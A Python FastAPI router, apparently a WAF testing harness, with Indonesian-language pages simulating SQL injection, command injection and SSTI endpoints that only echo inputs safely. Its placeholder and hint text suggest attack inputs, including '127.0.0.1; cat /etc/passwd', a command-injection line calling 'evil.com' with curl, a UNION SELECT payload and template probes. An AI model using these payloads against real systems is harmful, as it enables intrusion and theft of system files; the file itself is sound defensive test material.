from fastapi import APIRouter
from fastapi.responses import HTMLResponse
import html
import aiosqlite

from vuln import base_page

router = APIRouter()


@router.get("/vuln/sql-injection", response_class=HTMLResponse)
async def sql_injection(id: str = ""):
    safe = html.escape(id)
    body = "<p>Kirim payload SQL Injection. App hanya menampilkan payload — query tetap parameterized.</p>"
    if id:
        body += f"""
        <p>Payload diterima: <code>{safe}</code></p>
        <p>Query asli (parameterized): <code>SELECT * FROM tasks WHERE id = ?</code></p>
        <p>Hasil query aman:</p>
        """
        async with aiosqlite.connect("todos.db") as db:
            db.row_factory = aiosqlite.Row
            try:
                rows = await db.execute_fetchall(
                    "SELECT * FROM tasks WHERE id = ?", (id,)
                )
                if rows:
                    for r in rows:
                        d = dict(r)
                        body += "<table border=1 style='border-collapse:collapse'><tr>"
                        for k, v in d.items():
                            body += f"<td>{html.escape(str(v))}</td>"
                        body += "</tr></table>"
                else:
                    body += "<p>No results (parameterized query jalan normal).</p>"
            except Exception as e:
                body += f"<p>Error (tapi aman, bukan injection): {html.escape(str(e))}</p>"
    else:
        body += '<form><input name="id" placeholder="1 UNION SELECT 1,2,3,4,5,6"><button type="submit">Kirim</button></form>'
    body += '<p>Coba: <code>1 UNION SELECT 1,2,3,4,5,6</code> — WAF harus blokir ini.</p>'
    return base_page("SQL Injection Test", body)


@router.get("/vuln/command-injection", response_class=HTMLResponse)
async def command_injection(host: str = ""):
    safe = html.escape(host)
    body = "<p>Payload command injection hanya ditampilkan, <strong>tidak dieksekusi</strong>.</p>"
    if host:
        body += f"""
        <p>Payload diterima: <code>{safe}</code></p>
        <p>Perintah yang seharusnya dijalankan: <code>ping -c 1 {safe}</code></p>
        <p class="tag" style="background:#f44;color:#fff;padding:4px 8px">
            ⛔ EKSEKUSI DIBLOKIR — hanya simulasi
        </p>
        """
    body += '<form><input name="host" placeholder="127.0.0.1; cat /etc/passwd"><button type="submit">Kirim</button></form>'
    body += '<p>Coba: <code>127.0.0.1; curl http://evil.com</code></p>'
    return base_page("Command Injection Test", body)


@router.get("/vuln/ssti", response_class=HTMLResponse)
async def ssti(name: str = ""):
    safe = html.escape(name)
    body = "<p>SSTI test — Jinja2 autoescape ON, template tidak bisa di-inject.</p>"
    if name:
        body += f"""
        <p>Payload diterima: <code>{safe}</code></p>
        <p>Hasil render (aman): <strong>{safe}</strong></p>
        <p class="tag" style="background:#f44;color:#fff;padding:4px 8px">
            ⛔ SSTI DIBLOKIR — autoescape aktif
        </p>
        """
    body += '<form><input name="name" placeholder="{{7*7}}"><button type="submit">Kirim</button></form>'
    body += '<p>Coba: <code>{{config}}</code> atau <code>{{7*7}}</code> — akan tampil sebagai teks.</p>'
    return base_page("SSTI Test", body)
